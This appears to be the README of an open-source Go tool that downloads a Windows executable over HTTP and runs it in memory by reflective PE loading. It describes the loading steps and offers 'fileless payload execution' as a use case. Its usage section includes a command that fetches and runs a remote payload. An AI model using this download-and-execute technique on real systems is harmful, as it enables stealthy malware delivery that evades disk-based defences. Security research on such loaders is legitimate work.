# go http memexec

A lightweight, memory-safe Windows PE file execution tool that downloads and executes payloads without ever touching the disk.

## Features

- **Zero Disk I/O**: Downloads executables directly to memory and never writes them to disk
- **Pure Go Implementation**: 100% Go code with no CGO dependencies (thank you binject/debug you guys are truly the goats)
- **Memory-Safe Execution**: Implements proper memory protection and relocation
- **TLS Callback Support**: Properly handles TLS callbacks in PE files
- **Simple API**: Single command to download and execute payloads

## How It Works

go http memexec uses a sophisticated reflective PE loading technique to run executables in memory:

1. Downloads a PE file directly to memory using golang's net/http
2. Parses the PE file structure using the Binject/debug/pe package
3. Maps the PE file into memory with proper section permissions
4. Resolves imports and fixes relocations
5. Handles TLS callbacks properly
6. Executes the payload by jumping to its entry point

## Usage

```bash
# Basic usage with default URL
./go-http-memexec

# Specify a custom download URL
./go-http-memexec https://example.com/payload.exe
```

## Use Cases

- Security testing and research
- Memory-resident application deployment
- Advanced Windows process manipulation research
- Fileless payload execution

## Technical Details

The project is built entirely in Go:

- Uses golang's net/http to stream downloads directly to memory
- Implements PE parsing using the Binject/debug/pe package
- Properly handles relocations, import resolution, and TLS callbacks
- Sets appropriate memory protections for PE sections
- Executes code directly from memory with no disk I/O

## Build Instructions

```bash
# Get dependencies
go mod tidy

# Build the executable
go build -ldflags="-s -w" -trimpath -o go-http-memexec.exe
```

## Security Considerations

This tool is designed for legitimate security research, testing, and educational purposes only. The ability to execute code directly from memory without touching disk is a powerful capability that should be used responsibly.

## Requirements

- Windows operating system
- Go 1.20 or later

## Notes
- This project has only been tested on Windows 10
- This is a rewrite of the original C++-based implementation, now in 100% pure Go

## License

[MIT License](LICENSE)

## Disclaimer

This project is provided for educational and research purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. 